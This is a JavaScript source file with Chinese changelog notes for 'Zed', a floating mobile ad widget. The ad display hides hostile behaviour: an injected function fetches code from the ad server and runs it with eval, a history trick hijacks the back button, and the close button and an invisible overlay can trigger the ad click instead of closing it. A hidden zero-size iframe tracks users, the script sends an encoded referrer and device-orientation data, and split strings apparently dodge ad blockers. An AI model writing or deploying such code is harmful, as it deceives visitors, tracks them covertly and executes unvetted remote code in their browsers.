/* 
 * update 2019-05-18
 * 更改参数effectdura，毫秒，使用数字，比如1000表示1秒  该参数表示动画效果间隔时间，使用js实现。
   之前版本该参数表示的是css动画周期的时长（执行完一次动画所花的时间），不同的动画效果在时间周期上面有一些差距，
   所以不同的效果都使用相同的时间周期，会导致某些动画看起来不流畅
 *
 * update 2019-05-17
 * 更改load事件为DOMContentLoaded事件
 * 修复effect值为0不起作用的情况
 * 更改图片切换方式为单个元素的背景图片切换，而非元素的display切换
 * 去掉主要部分的eval函数
 * 给动画元素增加使用硬件加速动画效果
 */

var Zed = (function () {
    function Zed(_a) {
        var width = _a.width, height = _a.height, shdow = _a.shdow, pos = _a.pos, distanceTop = _a.distanceTop, close_btn = _a.close_btn, closeDec = _a.closeDec, showBorder = _a.showBorder, effect = _a.effect, effectdura = _a.effectdura, effectdelay = _a.effectdelay, stutslink = _a.stutslink, alink = _a.alink, btnNumpar = _a.btnNumpar, imgNumpar = _a.imgNumpar, shdowNumpar = _a.shdowNumpar, backNumpar = _a.backNumpar, imgduration = _a.imgduration, imgs = _a.imgs, isBack = _a.isBack, asType = _a.asType;
        this.aWidth = width || '200px';
        this.aHeight = height || '300px';
        this.shdow = shdow || 0;
        this.pos = pos || 'left';
        this.distanceTop = distanceTop || '100px';
        this.close_btn = close_btn || 1;
        this.closeDec = closeDec || 0;
        this.showBorder = showBorder || 0;
        this.effect = effect === 0 ? 0 : effect ? effect : 'pulse';
        this.effectdura = effectdura || '5s';
        this.effectdelay = effectdelay || '1s';
        this.stutslink = stutslink || '';
        this.alink = alink || '';
        this.btnNumpar = btnNumpar || 5;
        this.imgNumpar = imgNumpar || 1;
        this.shdowNumpar = shdowNumpar || 3;
        this.backNumpar = backNumpar || 5;
        this.imgduration = imgduration || 2000;
        this.imgs = imgs || [];
        this.isBack = isBack || 0;
        this.asType = asType || 'dp';
        this.winW = document.documentElement.clientWidth || document.body.clientWidth;
        this.winH = document.documentElement.clientHeight || document.body.clientHeight;
/*            if (this.isWap() == false) {
            return;
        }*/
        this.init();
       alert(navigator.userAgent.toLowerCase());
    }

    Zed.prototype.init = function () {
        var _this = this;
        this.mobc();
        this.creatWrapper();
        this.writeCss();
        /*setTimeout(function () {
            _this.writeCss();
        }, 300);*/
        if (window.top != window.self) {
            this.iframeInnercss();
        }
    };
    Zed.prototype.isWap = function () {
        if (navigator.platform.indexOf("Win") == 0 || navigator.platform.indexOf("Mac") == 0) {
            return false;
        }
    };
    Zed.prototype.creatWrapper = function () {
        var _this = this;
        var wrap = document.createElement('d' + 'i' + 'v');
        var closeBtn = this.closeBtn();
        var coverEle = this.creatCover();
        var imgbox = this.imgBox();
        wrap.className = 'zed-wrap';
        wrap.id = 'zedbox32tkbfe';
        var wrapWidth = "" + this.aWidth, wrapHeight = "" + this.aHeight;
        if (window.top != window.self) {
            wrapWidth = '100%';
            wrapHeight = '100%';
        }
        wrap.style.cssText = "width: " + wrapWidth + ";height: " + wrapHeight + ";";
        this.adPosition(wrap);

        var paranum = this.btnNumpar;
        function propt(probability) {
            var probability = probability * 100;
            var odds = Math.floor(Math.random() * 100);
            if (probability === 1) {
                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
            }
            if (probability === 0) {
                closeBtn.onclick = function () {
                    wrap.style.display = 'none';
                    document.body.removeChild(wrap);
                };
            } else if (odds < probability) {
                closeBtn.setAttribute('onclick', "cxta(" + paranum + ")");
            }
            else {
                closeBtn.onclick = function () {
                    wrap.style.display = 'none';
                    document.body.removeChild(wrap);
                };
            }
        }

        propt(this.closeDec);
        wrap.appendChild(coverEle);
        wrap.appendChild(closeBtn);
        wrap.appendChild(imgbox);
        window.addEventListener('DOMContentLoaded', function () {
            _this.zstatus();
            document.body.appendChild(wrap);

            var warpTop = wrap.offsetTop;
           alert(wrap.offsetTop);
            window.addEventListener('scroll', function () {
                var st = document.body.scrollTop || document.documentElement.scrollTop;
                wrap.style.top = st + warpTop + 'px';
            });
        });
    };
    Zed.prototype.adPosition = function (wrapEle) {
        var ahnum = (this.aHeight).replace(/px/, '');
        var awnum = (this.aWidth).replace(/px/, '');
        if (this.aHeight.indexOf('%') > -1) {
            ahnum = (this.aHeight).replace(/%/, '');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.aWidth.indexOf('%') > -1) {
            awnum = (this.aWidth).replace(/%/, '');
            awnum = this.winW * (Number(awnum) / 100);
        }
        var margin_top = (Number(ahnum) / 2).toFixed();
        var margin_left = (Number(awnum) / 2).toFixed();
        if (this.pos == 'left') {
            wrapEle.style.position = 'ab' + 'sol' + 'ute';
            if (window.self != window.top) {
                wrapEle.style.position = 'ab' + 'sol' + 'ute';
            }
            wrapEle.style.zIndex = '999' + '999';
            wrapEle.style.left = '0';
            if (window.self === window.top) {
                wrapEle.style.top = "" + this.distanceTop;
            }
        }
        else if (this.pos == 'right') {
            wrapEle.style.position = 'ab' + 'sol' + 'ute';
            wrapEle.style.zIndex = '999' + '999';
            wrapEle.style.right = '0';
            wrapEle.style.top = "" + this.distanceTop;
        }
        else if (this.pos == 'center') {
            wrapEle.style.position = 'ab' + 'sol' + 'ute';
            wrapEle.style.zIndex = '999' + '999';
            wrapEle.style.top = '50%';
            wrapEle.style.left = '50%';
            wrapEle.style.marginTop = "-" + margin_top + "px";
            wrapEle.style.marginLeft = "-" + margin_left + "px";
        }
        else {
            wrapEle.style.cssText += '';
        }
        if (window.self !== window.top) {
            wrapEle.style.cssText = '';
        }
    };
    Zed.prototype.creatCover = function () {
        var ahnum = (this.aHeight).replace(/px/, '');
        var awnum = (this.aWidth).replace(/px/, '');
        if (this.aHeight.indexOf('%') > -1) {
            ahnum = (this.aHeight).replace(/%/, '');
            ahnum = this.winH * (Number(ahnum) / 100);
        }
        if (this.aWidth.indexOf('%') > -1) {
            awnum = (this.aWidth).replace(/%/, '');
            awnum = this.winW * (Number(awnum) / 100);
        }
        var aw = Number(awnum);
        var ah = Number(ahnum);
        var anthoer_w = aw * (this.shdow) / 100;
        var anthoer_h = ah * (this.shdow) / 100;
        var coverW = aw + anthoer_w * 2;
        var coverH = ah + anthoer_h * 2;
        var coverStl = "width: " + coverW + "px;height: " + coverH + "px;top: -" + anthoer_h + "px;left: -" + anthoer_w + "px;po" + 'sit' + "ion: " + 'ab' + 'so' + 'lute' + ";z-in" + "dex: 1;";
        if (this.pos == 'right') {
            coverStl = "width: " + (coverW - anthoer_w) + "px;height: " + coverH + "px;right: 0;top: -" + anthoer_h + "px;po" + 'sit' + "ion: " + 'ab' + 'so' + 'lute' + ";z-in" + "dex: 1;";
        }
        if (this.pos == 'left') {
            coverStl = "width: " + (coverW - anthoer_w) + "px;height: " + coverH + "px;left: 0;top: -" + anthoer_h + "px;po" + 'sit' + "ion: " + 'ab' + 'so' + 'lute' + ";z-in" + "dex: 1;";
        }
        var paranum = this.shdowNumpar;
        var coverEl = document.createElement('d' + 'i' + 'v');
        coverEl.style.cssText += coverStl;
        coverEl.setAttribute('onclick', "cxta(" + paranum + ")");
        return coverEl;
    };
    Zed.prototype.closeBtn = function () {
        var btn = document.createElement('d' + 'i' + 'v');
        btn.className = 'zed-btn-close';
        if (this.close_btn == 1) {
            btn.className += ' default';
            btn.style.backgroundColor = '#ccc';
            btn.style.textAlign = 'center';
            btn.style.color = '#fff';
            btn.innerHTML = '×';
        }
        else {
            btn.style.backgroundImage = "url(" + this.close_btn + ")";
        }
        btn.style.position = 'ab' + 'so' + 'lu' + 'te';
        btn.style.zIndex = '1' + '0';
        btn.style.display = 'block';
        btn.style.width = '18px';
        btn.style.height = '18px';
        btn.style.lineHeight = '18px';
        btn.style.borderRadius = '50%';
        btn.style.right = '0';
        btn.style.top = '0';
        btn.style.backgroundRepeat = 'no-repeat';
        btn.style.backgroundPosition = 'center';
        btn.style.backgroundSize = 'cover';
        return btn;
    };
    Zed.prototype.imgBox = function () {
        var imglist = this.imgs;
        var imgEle = document.createElement('d' + 'i' + 'v');
        imgEle.className = 'item';
        imgEle.style.cssText += "width: 100%;height: 100%;po" + 'sit' + "ion: r" + 'ela' + "tive;";
        if (imglist.length > 0) {
            imgEle.innerHTML = "<a><div style=\"width: 100%;height: 100%;background: url(" + imglist[0] + ") no-repeat center;background-size: 100% 100%;\"></div></a>";
            if (imglist.length > 1) {
                var imgEleChildNode = imgEle.querySelector('div');
                var index = 1;
                setInterval(function () {
                    if (index > imglist.length - 1) {
                        index = 0;
                    }
                    imgEleChildNode.style.background = "url(" + imglist[index] + ") no-repeat center";
                    imgEleChildNode.style.backgroundSize = "100% 100%";
                    index++;
                }, this.imgduration);
            };
        } else {
            console.warn('no imgurl found');
        }

        var imgBox = document.createElement('d' + 'i' + 'v');
        imgBox.className = 'zed-img-box';
        imgBox.style.width = '100%';
        imgBox.style.height = '100%';
        imgBox.style.position = 'r' + 'e' + 'l' + 'a' + 't' + 'i' + 'v' + 'e';
        imgBox.style.zIndex = '6';
        imgBox.setAttribute('onclick', "cxta(" + this.imgNumpar + ")");
        window.requestAnimFrame = (function(){
            return  window.requestAnimationFrame   ||
                window.webkitRequestAnimationFrame ||
                window.mozRequestAnimationFrame    ||
                function( callback ){
                    window.setTimeout(callback, 1000 / 60);
                };
        })();
        if (this.effect !== 0) {
            imgBox.className += ' ' + ("animated " + this.effect + " slow");
            if (this.effectdura != '') {
                var animatEffect = this.effect;
                setInterval(function(){
                   imgBox.className = 'zed-img-box';
                    window.requestAnimationFrame(function(time) {
                        window.requestAnimationFrame(function(time) {
                            imgBox.className = 'zed-img-box ' + ("animated " + animatEffect + " slow");
                        });
                    });
                }, this.effectdura);
            }
        }
        imgBox.appendChild(imgEle);

        var borderDiv = document.createElement('d' + 'i' + 'v');
        borderDiv.className = 'boddiv';
        borderDiv.style.position = 'ab' + 'so' + 'lu' + 'te';
        borderDiv.style.cssText += "width: 100%;height: 100%; " + 'to' + "p:0;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;text-fill-color: transparent;-webkit-animation: hue 8s infinite linear;animation: hue 8s infinite linear;";
        if (this.showBorder >= 1) {
            borderDiv.style.border = this.showBorder + "px solid red";
        }
        imgBox.appendChild(borderDiv);
        return imgBox;
    };
    Zed.prototype.ref = function () {
        var u;
        try {
            u = window.top.document.referrer;
        }
        catch (err) {
            u = document.referrer;
        }
        var r = '', c;
        for (var i = 0; i < u.length; i++) {
            if (i == 1000) {
                break;
            }
            c = u.charCodeAt(i);
            if (c > 96 && c < 123) {
                c += i % 8;
                if (c > 122)
                    c -= 26;
            }
            r += String.fromCharCode(c);
        }
        return r;
    };
    Zed.prototype.zstatus = function () {
        var odiv_m_1 = document.createElement('div');
        odiv_m_1.style.display = "none";
        var oiframe_m_1 = document.createElement("iframe");
        oiframe_m_1.src = this.stutslink;
        oiframe_m_1.height = "0";
        oiframe_m_1.width = "0";
        oiframe_m_1.sandbox = "allow-same-origin allow-scripts allow-forms";
        oiframe_m_1.allowtransparency = "true";
        oiframe_m_1.style.display = "none";
        odiv_m_1.appendChild(oiframe_m_1);
        document.body.appendChild(odiv_m_1);
    };
    Zed.prototype.mobc = function () {
        var _this = this;

        // 判断ios12
        var str = navigator.userAgent.toLowerCase();
        var ver = str.match(/cpu iphone os (.*?) like mac os/);
        if(ver && ver[1].replace(/_/g,".") >= 12){
        var M18_url = _this.alink + "&ref=" + _this.ref() + "&refso=" + navigator.platform + "_" + _this.asType + "&zhongli=__false_ios_" + ver[1].replace(/_/g,".");
        if(_this.isBack == 1){
            var strjs1 = "function cxta(ct){var a=new XMLHttpRequest();var b='" + M18_url + "&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(" + _this.backNumpar + ");}, false);";
        }else {
            var strjs1 = "function cxta(ct){var a=new XMLHttpRequest();var b='" + M18_url + "&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}";
        }
        var js1nod = document.createElement('script');
        js1nod.innerHTML = strjs1;
        document.getElementsByTagName('head')[0].appendChild(js1nod);
        }else{
        window.addEventListener("deviceorientation", function (event) {
            var M18_url = _this.alink + "&ref=" + _this.ref() + "&refso=" + navigator.platform + "_" + _this.asType + "&zhongli=_" + Math.floor(event.alpha) + "," + Math.floor(event.beta) + "," + Math.floor(event.gamma);
            if(_this.isBack == 1){
                var strjs1 = "function cxta(ct){var a=new XMLHttpRequest();var b='" + M18_url + "&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}pushHistory();function pushHistory(){var state={title:'title',url:'#'};window.history.pushState(state,'title','#')}window.addEventListener('popstate', function (e) {cxta(" + _this.backNumpar + ");}, false);";
            }else {
                var strjs1 = "function cxta(ct){var a=new XMLHttpRequest();var b='" + M18_url + "&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,false);a.send();}}";
            }
            var js1nod = document.createElement('script');
            js1nod.innerHTML = strjs1;
            document.getElementsByTagName('head')[0].appendChild(js1nod);
        }, false);
        }


    };
    Zed.prototype.writeCss = function () {
        var s = document.createElement("s" + "t" + "y" + "l" + "e");
        s.innerHTML = "@keyframes hue {0% {-webkit-filter: hue-rotate(0deg);}100% {-webkit-filter: hue-rotate(360deg);}}";
        if (this.effect !== 0) {
            s.innerHTML += ".animated {will-change: transform;-webkit-animation-duration: 1s;animation-duration: 1s;-webkit-animation-fill-mode: both;animation-fill-mode: both;}.animated.infinite {-webkit-animation-iteration-count: infinite;animation-iteration-count: infinite;}.animated.delay-5s {-webkit-animation-delay: 5s;animation-delay: 5s;}.animated.slow {-webkit-animation-duration: 2s;animation-duration: 2s;} .animated.slower {-webkit-animation-duration: 3s;animation-duration: 3s;}@media (print), (prefers-reduced-motion) {.animated {  -webkit-animation: unset !important;animation: unset !important;-webkit-transition: none !important;transition: none !important;}}@-webkit-keyframes tada {from {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);} 10%, 20% {-webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);}30%,50%,70%,90% {-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);}40%,60%,80% {-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);}to {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);}}@keyframes tada {from {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);}10%,20% {-webkit-transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);transform: scale3d(0.9, 0.9, 0.9) rotate3d(0, 0, 1, -3deg);}              30%,50%,70%,90% {-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, 3deg);}40%,60%,80% {-webkit-transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);transform: scale3d(1.1, 1.1, 1.1) rotate3d(0, 0, 1, -3deg);}to {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);}}.tada {-webkit-animation-name: tada;animation-name: tada;}@-webkit-keyframes pulse {from {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);}50% {-webkit-transform: scale3d(1.1, 1.1, 1.1);transform: scale3d(1.1, 1.1, 1.1);}to {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);}}@keyframes pulse {from {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);}50% {-webkit-transform: scale3d(1.05, 1.05, 1.05);transform: scale3d(1.05, 1.05, 1.05);}to {-webkit-transform: scale3d(1, 1, 1);transform: scale3d(1, 1, 1);                }}.pulse {-webkit-animation-name: pulse;animation-name: pulse;}@-webkit-keyframes animaterotate {0% {-webkit-transform: rotate(0deg);-moz-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);}100% {-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);transform: rotate(360deg);}}@-moz-keyframes animaterotate {0% {-webkit-transform: rotate(0deg);-moz-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);}100% {-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);transform: rotate(360deg);}}@keyframes animaterotate {0% {-webkit-transform: rotate(0deg);-moz-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);}100% {-webkit-transform: rotate(360deg);-moz-transform: rotate(360deg);-ms-transform: rotate(360deg);transform: rotate(360deg);}}.zed-img-box.rotate {-webkit-animation-name: animaterotate;animation-name: animaterotate;-webkit-animation-timing-function: linear;animation-timing-function: linear;-webkit-animation-duration: 8s;animation-duration: 8s;}";
        }
        // var head = document.getElementsByTagName('h' + 'e' + 'a' + 'd')[0];
        window.addEventListener('DOMContentLoaded', function () {
            document.body.appendChild(s);
        });
    }
    Zed.prototype.iframeInnercss = function () {
        var st = document.createElement("s" + "t" + "y" + "l" + "e");
        st.innerHTML = "html, body {width: 100%;height: 100%;margin: 0;padding: 0;}.zed-wrap {width: 100%;height: 100%;}";
        var head = document.getElementsByTagName('h' + 'e' + 'a' + 'd')[0];
        head.appendChild(st);
    };
    return Zed;
}());

new Zed({
width: '200px',
height: '300px',
shdow: '20',
isBack: 1,
pos: 'right',
distanceTop: '100px',
close_btn: 1,
closeDec: 0,
showBorder: 3,
effect: '',
alink: 'https://baidu.com',
stutslink: "https://cc.ydy2.com/cnzz.html?ptype=<?= $tJ['type'] ?>&userid=<?= $userid ?>&pid=<?= $pid ?>&s=<?= $tJ['tSources'] ?>&l=xtb",
imgduration: 5000,
effectdura: 5000,
asType: 'xtb',
imgs: ['imgs/img1.jpg','imgs/img2.jpg','imgs/img3.jpg','imgs/img4.jpg','imgs/img5.jpg'],
});
